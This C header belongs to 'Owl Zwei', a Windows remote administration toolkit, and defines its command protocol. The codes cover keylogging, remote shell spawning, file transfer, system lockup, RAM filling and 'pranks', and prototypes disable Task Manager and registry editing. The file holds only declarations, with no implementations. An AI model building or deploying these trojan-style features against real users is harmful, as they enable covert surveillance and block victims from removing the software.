/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#ifndef __OWL_MISC_H__
#define __OWL_MISC_H__


#include <windows.h>
#include <shlwapi.h>
#include "RegHelper.h"

#define OWL_MONIKER	"Owl_zwei.exe"
extern  char owl_installed_path[];
#define MAX_BUF_LEN	1024
//--------------------------------------------------------------------
#define MB(msg) MessageBox(0,(msg),"",MB_OK)
//--------------------------------------------------------------------
#define CMD_FILE	0
#define CMD_HW		1
#define CMD_KEYBD	2
#define CMD_MOUSE	3
#define CMD_SHELL	4
#define CMD_SYS		5
#define CMD_TBAR	6
#define CMD_PRANK	7
#define CMD_REG		8
#define CMD_OWL		9
//--------------------------------------------------------------------
#define FILE_SDIR	0
#define FILE_SDRV	1
#define FILE_SEND	2
#define FILE_RECV	3
#define FILE_MKDIR	4
#define FILE_SDIREX	5
//--------------------------------------------------------------------
#define HW_OPENCD	0x0
#define HW_CLOSECD	0x1
#define HW_MOUSE_R	0x2
#define HW_MOUSE_L	0x3
#define HW_MOUSE_SW	0x4
#define HW_MONITOR1	0x5
#define HW_MONITOR0	0x6
#define HW_DB_CLK	0x7
#define HW_INPUT1	0x8
#define HW_INPUT0	0x9
#define HW_REBOOT	0xa
#define HW_SHTDWN	0xb
//--------------------------------------------------------------------
#define KEYBD_STARTLOG	0
#define KEYBD_STOPLOG	1
//--------------------------------------------------------------------
#define MOUSE_FLY_STOP	 0	
#define MOUSE_FLY		 1
#define MOUSE_RESTRICT	 2
#define MOUSE_SHOW		 3
#define MOUSE_HIDE		 4
#define MOUSE_CLK		 5
#define MOUSE_CLK_PT	 6
#define MOUSE_SETPOS	 7
#define MOUSE_FLY_CLK	 8
//--------------------------------------------------------------------
#define SHELL_SPAWN	0
//--------------------------------------------------------------------
#define SYS_MAXMEM	 0x0
#define SYS_BUSYMEM	 0x1
#define SYS_FREEMEM	 0x2
#define SYS_MAXDISK	 0x3
#define SYS_USEDDISK 0x4
#define SYS_FREEDISK 0x5
#define SYS_SYSDIR	 0x6
#define SYS_WINDIR	 0x7
#define SYS_CHDIR	 0x8
#define SYS_LOCKUP	 0x9
#define SYS_RAMFILL	 0xa
//--------------------------------------------------------------------
#define TBAR_SHOW		0
#define TBAR_HIDE		1
#define TBAR_STBN_SHOW	2
#define TBAR_STBN_HIDE	3
#define TBAR_STBN_FLY1	4
#define TBAR_STBN_FLY0	5
#define TBAR_CLOCK_SHOW 6
#define TBAR_CLOCK_HIDE	7
#define TBAR_ENABLE		8
#define TBAR_DISABLE	9
//--------------------------------------------------------------------
#define PRANK_DTP_ENABLE	0
#define PRANK_DTP_DISABLE	1
#define PRANK_FU_START		2
#define PRANK_FU_STOP		3
#define PRANK_WRUN_START	4
#define PRANK_WRUN_STOP		5
#define PRANK_QUAKE_START	6
#define PRANK_QUAKE_STOP	7
//--------------------------------------------------------------------
#define OWL_UNINSTALL		0
//--------------------------------------------------------------------
union sh_t{
	int  nums[16];
	char str[256];
};
//--------------------------------------------------------------------
struct regball{
	int  type;
	union{
		DWORD dwVal;
		TCHAR szVal[1024];
	};
	char valname[512];
};
//--------------------------------------------------------------------
struct cmd_t{
	int  cmd_object;
	int  args;
	union sh_t addnl;
	struct regball *reg;
};
//--------------------------------------------------------------------
HANDLE new_thread( LPTHREAD_START_ROUTINE lpFunc , LPVOID lpParam );
//--------------------------------------------------------------------
char** split( const char *delim , const char *str , char **result );
//--------------------------------------------------------------------
void strtrim( char *s );
//--------------------------------------------------------------------
BOOL strequal( const char *s1 , const char *s2 );
//--------------------------------------------------------------------
void parse_cmd( const char *cmd , struct cmd_t *pCmd);
//--------------------------------------------------------------------
void DisableTaskMgr( bool disable );
//--------------------------------------------------------------------
void DisableRegistryEditing( bool disable );
//--------------------------------------------------------------------

#endif
